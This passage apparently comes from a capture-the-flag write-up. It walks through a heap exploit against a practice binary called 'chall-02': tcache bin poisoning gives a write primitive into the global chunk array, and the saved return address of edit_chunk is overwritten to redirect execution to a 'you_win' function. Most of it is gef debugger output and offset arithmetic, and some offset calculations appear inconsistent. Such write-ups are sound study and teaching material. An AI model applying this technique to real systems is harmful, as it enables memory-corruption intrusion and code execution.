The tcache sizes array ends at `0x55911e1cb010 + 0x80 = 0x55911e1cb090`, so the bin head ptrs begin at `0x55911e1cb010`. Since we are wanting to write to the ninth value (based at `0` so index of `8`), and ptrs are `0x08` bytes long, the bin head ptr location we want to write to is `0x55911e1cb090 + 0x8*0x8 = 0x55911e1cb0d0`.

We will be using the same index to write to these values (chunk `0x55911e1ccbd0`), and we can calculate the offsets to reach them like this:

```
(0x55911e1ccbd0 - 0x55911e1cb0d0) / 8 = 864
(0x55911e1ccbd0 - 0x55911e1cb020) // 8 = 0x886
```

Next up, we will just allocate another heap chunk:

```
gef➤  x/20g 0x55911df28040
0x55911df28040 <chunks>:    0x55911e1cc6c0    0x55911e1ccbd0
0x55911df28050 <chunks+16>:    0x0    0x0
0x55911df28060 <chunks+32>:    0x0    0x0
0x55911df28070 <chunks+48>:    0x0    0x0
0x55911df28080 <chunks+64>:    0x0    0x0
0x55911df28090:    0x0    0x0
0x55911df280a0 <chunk_sizes>:    0x80000000a0    0x0
0x55911df280b0 <chunk_sizes+16>:    0x0    0x0
0x55911df280c0 <chunk_sizes+32>:    0x0    0x0
0x55911df280d0:    0x0    0x0
gef➤  x/10g 0x55911e1cc6b0
0x55911e1cc6b0:    0x0    0xb1
0x55911e1cc6c0:    0x7febc602d130    0x7febc602d130
0x55911e1cc6d0:    0x55911e1cc6b0    0x55911e1cc6b0
0x55911e1cc6e0:    0x0    0x0
0x55911e1cc6f0:    0x0    0x0
```

So we see a new heap chunk allocated at `0x55911e1cc6c0`. We allocated this to have the corresponding `chunk_sizes` value set. Now to allocate a chunk to `chunks`, which we prepared with the tcache bin overwrite:

```
gef➤  x/20g 0x55911df28040
0x55911df28040 <chunks>:    0x55911e1cc6c0    0x0
0x55911df28050 <chunks+16>:    0x55911df28040    0x0
0x55911df28060 <chunks+32>:    0x0    0x0
0x55911df28070 <chunks+48>:    0x0    0x0
0x55911df28080 <chunks+64>:    0x0    0x0
0x55911df28090:    0x0    0x0
0x55911df280a0 <chunk_sizes>:    0x80000000a0    0x90
0x55911df280b0 <chunk_sizes+16>:    0x0    0x0
0x55911df280c0 <chunk_sizes+32>:    0x0    0x0
0x55911df280d0:    0x0    0x0
gef➤  x/10g 0x55911df28040
0x55911df28040 <chunks>:    0x55911e1cc6c0    0x0
0x55911df28050 <chunks+16>:    0x55911df28040    0x0
0x55911df28060 <chunks+32>:    0x0    0x0
0x55911df28070 <chunks+48>:    0x0    0x0
0x55911df28080 <chunks+64>:    0x0    0x0
gef➤  x/200g 0x000055911e1cb000
0x55911e1cb000:    0x0    0x291
0x55911e1cb010:    0x0    0x0
0x55911e1cb020:    0x0    0x0
0x55911e1cb030:    0x0    0x0
0x55911e1cb040:    0x0    0x0
0x55911e1cb050:    0x0    0x0
0x55911e1cb060:    0x0    0x0
0x55911e1cb070:    0x0    0x0
0x55911e1cb080:    0x0    0x0
0x55911e1cb090:    0x0    0x0
0x55911e1cb0a0:    0x0    0x0
0x55911e1cb0b0:    0x0    0x0
0x55911e1cb0c0:    0x0    0x0
0x55911e1cb0d0:    0x5594470d19e8    0x0
0x55911e1cb0e0:    0x0    0x0
0x55911e1cb0f0:    0x0    0x0
0x55911e1cb100:    0x0    0x0
0x55911e1cb110:    0x0    0x0
0x55911e1cb120:    0x0    0x0
0x55911e1cb130:    0x0    0x0
0x55911e1cb140:    0x0    0x0
0x55911e1cb150:    0x0    0x0
0x55911e1cb160:    0x0    0x0
0x55911e1cb170:    0x0    0x0
0x55911e1cb180:    0x0    0x0
0x55911e1cb190:    0x0    0x0
0x55911e1cb1a0:    0x0    0x0
0x55911e1cb1b0:    0x0    0x0
0x55911e1cb1c0:    0x0    0x0
0x55911e1cb1d0:    0x0    0x0
0x55911e1cb1e0:    0x0    0x0
0x55911e1cb1f0:    0x0    0x0
0x55911e1cb200:    0x0    0x0
0x55911e1cb210:    0x0    0x0
0x55911e1cb220:    0x0    0x0
0x55911e1cb230:    0x0    0x0
0x55911e1cb240:    0x0    0x0
0x55911e1cb250:    0x0    0x0
0x55911e1cb260:    0x0    0x0
0x55911e1cb270:    0x0    0x0
0x55911e1cb280:    0x0    0x0
0x55911e1cb290:    0x0    0x411
0x55911e1cb2a0:    0x6520657361656c50    0x6e656d207265746e
0x55911e1cb2b0:    0x6563696f68632075    0x292e320a6b6e0a3a
0x55911e1cb2c0:    0x6843207765695620    0x20292e330a6b6e75
0x55911e1cb2d0:    0x7568432074696445    0x4620292e340a6b6e
0x55911e1cb2e0:    0x6e75684320656572    0xa6b
0x55911e1cb2f0:    0x0    0x0
0x55911e1cb300:    0x0    0x0
0x55911e1cb310:    0x0    0x0
0x55911e1cb320:    0x0    0x0
0x55911e1cb330:    0x0    0x0
0x55911e1cb340:    0x0    0x0
0x55911e1cb350:    0x0    0x0
0x55911e1cb360:    0x0    0x0
0x55911e1cb370:    0x0    0x0
0x55911e1cb380:    0x0    0x0
0x55911e1cb390:    0x0    0x0
0x55911e1cb3a0:    0x0    0x0
0x55911e1cb3b0:    0x0    0x0
0x55911e1cb3c0:    0x0    0x0
0x55911e1cb3d0:    0x0    0x0
0x55911e1cb3e0:    0x0    0x0
0x55911e1cb3f0:    0x0    0x0
0x55911e1cb400:    0x0    0x0
0x55911e1cb410:    0x0    0x0
0x55911e1cb420:    0x0    0x0
0x55911e1cb430:    0x0    0x0
0x55911e1cb440:    0x0    0x0
0x55911e1cb450:    0x0    0x0
0x55911e1cb460:    0x0    0x0
0x55911e1cb470:    0x0    0x0
0x55911e1cb480:    0x0    0x0
0x55911e1cb490:    0x0    0x0
0x55911e1cb4a0:    0x0    0x0
0x55911e1cb4b0:    0x0    0x0
0x55911e1cb4c0:    0x0    0x0
0x55911e1cb4d0:    0x0    0x0
0x55911e1cb4e0:    0x0    0x0
0x55911e1cb4f0:    0x0    0x0
0x55911e1cb500:    0x0    0x0
0x55911e1cb510:    0x0    0x0
0x55911e1cb520:    0x0    0x0
0x55911e1cb530:    0x0    0x0
0x55911e1cb540:    0x0    0x0
0x55911e1cb550:    0x0    0x0
0x55911e1cb560:    0x0    0x0
0x55911e1cb570:    0x0    0x0
0x55911e1cb580:    0x0    0x0
0x55911e1cb590:    0x0    0x0
0x55911e1cb5a0:    0x0    0x0
0x55911e1cb5b0:    0x0    0x0
0x55911e1cb5c0:    0x0    0x0
0x55911e1cb5d0:    0x0    0x0
0x55911e1cb5e0:    0x0    0x0
0x55911e1cb5f0:    0x0    0x0
0x55911e1cb600:    0x0    0x0
0x55911e1cb610:    0x0    0x0
0x55911e1cb620:    0x0    0x0
0x55911e1cb630:    0x0    0x0
```

So we see, we allocated a ptr to chunks (`0x55911df28040`) stored at `0x55911df28050`. We see that the chunks ptr at `0x55911df28048` got cleared out, I believe this was cleared out as part of the tcache key getting cleared when a tcache chunk gets reallocated. Now, let's go ahead, and write to `chunks`, a stack address of where the return address of `edit_chunk` gets written:

```
gef➤  x/10g 0x55911df28040
0x55911df28040 <chunks>:    0x7ffed884faa8    0x0
0x55911df28050 <chunks+16>:    0x55911df28040    0x0
0x55911df28060 <chunks+32>:    0x0    0x0
0x55911df28070 <chunks+48>:    0x0    0x0
0x55911df28080 <chunks+64>:    0x0    0x0
```

Now, let's overwrite the return address of `edit_chunk` from within that function, and get code execution:

```
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x000055911df252db  →  <you_win+0> endbr64
$rbx   : 0x0          	 
$rcx   : 0x00007ffed884fa4e  →  0x000000000000000a ("\n"?)
$rdx   : 0x00007ffed884faa8  →  0x000055911df25294  →  <main+107> jmp 0x55911df25235 <main+12>
$rsp   : 0x00007ffed884fa80  →  0x0000000000000000
$rbp   : 0x00007ffed884faa0  →  0x00007ffed884fac0  →  0x0000000000000001
$rsi   : 0x000055911df252db  →  <you_win+0> endbr64
$rdi   : 0xa          	 
$rip   : 0x000055911df25758  →  <edit_chunk+216> mov QWORD PTR [rdx], rax
$r8	: 0x1999999999999999
$r9	: 0x0          	 
$r10   : 0x00007febc5f73ac0  →  0x0000000100000000
$r11   : 0x00007febc5f743c0  →  0x0002000200020002
$r12   : 0x00007ffed884fbd8  →  0x00007ffed8851483  →  "./chall-02"
$r13   : 0x000055911df25229  →  <main+0> endbr64
$r14   : 0x000055911df27d78  →  0x000055911df251e0  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007febc6206020  →  0x00007febc62072e0  →  0x000055911df24000  →   jg 0x55911df24047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffed884fa80│+0x0000: 0x0000000000000000     ← $rsp
0x00007ffed884fa88│+0x0008: 0x00000000000000a0
0x00007ffed884fa90│+0x0010: 0x00007ffed884faa8  →  0x000055911df25294  →  <main+107> jmp 0x55911df25235 <main+12>
0x00007ffed884fa98│+0x0018: 0x000055911df252db  →  <you_win+0> endbr64
0x00007ffed884faa0│+0x0020: 0x00007ffed884fac0  →  0x0000000000000001     ← $rbp
0x00007ffed884faa8│+0x0028: 0x000055911df25294  →  <main+107> jmp 0x55911df25235 <main+12>     ← $rdx
0x00007ffed884fab0│+0x0030: 0x0000000000000000
0x00007ffed884fab8│+0x0038: 0x00000003c61ee080
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55911df2574d <edit_chunk+205> mov	rax, QWORD PTR [rbp-0x10]
   0x55911df25751 <edit_chunk+209> add	rdx, rax
   0x55911df25754 <edit_chunk+212> mov	rax, QWORD PTR [rbp-0x8]
 → 0x55911df25758 <edit_chunk+216> mov	QWORD PTR [rdx], rax
   0x55911df2575b <edit_chunk+219> lea	rax, [rip+0xbc7]    	# 0x55911df26329
   0x55911df25762 <edit_chunk+226> mov	rdi, rax
   0x55911df25765 <edit_chunk+229> call   0x55911df250d0 <puts@plt>
   0x55911df2576a <edit_chunk+234> leave  
   0x55911df2576b <edit_chunk+235> ret    
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-02", stopped 0x55911df25758 in edit_chunk (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55911df25758 → edit_chunk()
[#1] 0x55911df25294 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$2 = 0x55911df252db
gef➤  p $rdx
$3 = 0x7ffed884faa8
gef➤  x/g 0x55911df252db
0x55911df252db <you_win>:    0xe5894855fa1e0ff3
gef➤  i f
Stack level 0, frame at 0x7ffed884fab0:
 rip = 0x55911df25758 in edit_chunk; saved rip = 0x55911df25294
 called by frame at 0x7ffed884fad0
 Arglist at 0x7ffed884faa0, args:
 Locals at 0x7ffed884faa0, Previous frame's sp is 0x7ffed884fab0
 Saved registers:
  rbp at 0x7ffed884faa0, rip at 0x7ffed884faa8
gef➤  b *you_win
Breakpoint 3 at 0x55911df252db
gef➤  c
Continuing.

Breakpoint 3, 0x000055911df252db in you_win ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x19         	 
$rbx   : 0x0          	 
$rcx   : 0x00007febc5ef53b4  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x0          	 
$rsp   : 0x00007ffed884fab0  →  0x0000000000000000
$rbp   : 0x00007ffed884fac0  →  0x0000000000000001
$rsi   : 0x000055911e1cb2a0  →  "\nChunk has been edited!\nalue\n\n?\n View Chunk\n[...]"
$rdi   : 0x00007febc602e8f0  →  0x0000000000000000
$rip   : 0x000055911df252db  →  <you_win+0> endbr64
$r8	: 0x1999999999999999
$r9	: 0x0          	 
$r10   : 0x00007febc5f73ac0  →  0x0000000100000000
$r11   : 0x202        	 
$r12   : 0x00007ffed884fbd8  →  0x00007ffed8851483  →  "./chall-02"
$r13   : 0x000055911df25229  →  <main+0> endbr64
$r14   : 0x000055911df27d78  →  0x000055911df251e0  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007febc6206020  →  0x00007febc62072e0  →  0x000055911df24000  →   jg 0x55911df24047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffed884fab0│+0x0000: 0x0000000000000000     ← $rsp
0x00007ffed884fab8│+0x0008: 0x00000003c61ee080
0x00007ffed884fac0│+0x0010: 0x0000000000000001     ← $rbp
0x00007ffed884fac8│+0x0018: 0x00007febc5e23fbd  →  <__libc_start_call_main+109> mov edi, eax
0x00007ffed884fad0│+0x0020: 0x00007febc61d2000  →  0x03010102464c457f
0x00007ffed884fad8│+0x0028: 0x000055911df25229  →  <main+0> endbr64
0x00007ffed884fae0│+0x0030: 0x00000001d884fbc0
0x00007ffed884fae8│+0x0038: 0x00007ffed884fbd8  →  0x00007ffed8851483  →  "./chall-02"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55911df252cc <main+163>   	mov	eax, 0x0
   0x55911df252d1 <main+168>   	call   0x55911df250f0 <printf@plt>
   0x55911df252d6 <main+173>   	jmp	0x55911df25235 <main+12>
 → 0x55911df252db <you_win+0>  	endbr64
   0x55911df252df <you_win+4>  	push   rbp
   0x55911df252e0 <you_win+5>  	mov	rbp, rsp
   0x55911df252e3 <you_win+8>  	lea	rax, [rip+0xd9c]    	# 0x55911df26086
   0x55911df252ea <you_win+15> 	mov	rdi, rax
   0x55911df252ed <you_win+18> 	call   0x55911df250d0 <puts@plt>
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-02", stopped 0x55911df252db in you_win (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55911df252db → you_win()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Here, we see the saved return address is `0x7ffed884faa8`. The stack infoleak we got was `0x7ffed884fa70`, so the offset from it to the value we want is `0x7ffed884faa8 - 0x7ffed884fa70 = 0x38`. We see here, we are overwriting the saved return address with the address of `you_win`, which we see get's called. Just like that, we solved the challenge.
